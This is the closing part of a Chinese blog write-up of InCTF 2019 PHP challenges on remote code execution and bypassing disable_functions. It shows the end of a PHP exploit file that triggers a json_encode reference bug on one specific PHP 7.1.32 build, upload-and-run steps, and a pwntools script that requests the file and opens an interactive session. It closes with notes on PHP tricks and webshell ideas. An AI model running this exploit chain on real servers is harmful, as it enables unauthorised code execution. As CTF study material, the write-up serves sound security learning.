<span class="hljs-keyword">if</span>(php_sapi_name() != <span class="hljs-string">'apache2handler'</span> ||
    phpversion() != <span class="hljs-string">'7.1.32-1+ubuntu16.04.1+deb.sury.org+1'</span>) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Wrong setup.'</span>);
&#125;

<span class="hljs-keyword">global</span> $y;
$y = [<span class="hljs-keyword">new</span> Z()];
json_encode([<span class="hljs-number">0</span> =&gt; &amp;$y]);</code></pre>

<ol>
<li><p>上传该php文件到服务器</p>
</li>
<li><p>本地执行</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
s = remote(<span class="hljs-string">'localhost'</span>, <span class="hljs-number">80</span>)
p = <span class="hljs-string">'GET /pwn.php HTTP/1.1\r\n'</span>
p += <span class="hljs-string">'Host: localhost\r\n\r\n'</span>
s.send(p)
s.interactive()</code></pre>
</li>
<li><p>执行环境必须是<code>php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2</code></p>
<p><img src="./1569483833588.png" srcset="/img/loading.gif" alt="1569483833588"></p>
</li>
<li><p>py执行结果</p>
<p>   <img src="./1569483928690.png" srcset="/img/loading.gif" alt="1569483928690"></p>
</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fireshellsecurity.team/inctf2019-php1-php15-php25/" target="_blank" rel="noopener">https://fireshellsecurity.team/inctf2019-php1-php15-php25/</a></p>
<p><a href="https://ctftime.org/writeup/16595" target="_blank" rel="noopener">https://ctftime.org/writeup/16595</a></p>
<h1 id="特性总结"><a href="#特性总结" class="headerlink" title="特性总结"></a>特性总结</h1><ol>
<li>php 对于ascii 0x7f默认为字符串</li>
<li>eval、echo为语言结构不是函数</li>
<li>eval的特性：只能执行一次代码</li>
<li>rce参考一些常见的webshell思路</li>
<li>_()为gettext()的别名</li>
</ol>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">vBulletin5-x前台代码执行漏洞(复现)</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/">
                        <span class="hidden-mobile">课程设计 | fafuscan</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Inctf题解 | rce+disable_functions bypass&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
